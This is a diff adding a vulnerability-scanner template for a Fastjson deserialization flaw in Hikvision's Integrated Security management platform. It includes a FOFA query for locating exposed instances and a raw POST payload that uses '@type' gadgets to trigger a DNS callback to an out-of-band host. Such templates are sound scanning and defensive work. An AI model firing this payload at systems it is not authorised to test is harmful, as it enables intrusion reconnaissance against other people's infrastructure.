@@ -1,0 +1,25 @@
+id: hikvision-integrated-security-fastjson
+
+info:
+  name: Hikvision Integrated Security Fastjson
+  author: zp857
+  severity: critical
+  tags: hikvision,fastjson,hikvision-integrated-security
+  metadata:
+    fofa-query: 'title="综合安防管理平台" || icon_hash="-808437027"'
+
+requests:
+  - raw:
+      - |
+        POST /bic/ssoService/v1/applyCT HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"a":{"@type":"java.lang.Class","val":"java.net.Inet4Address"},"b":{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
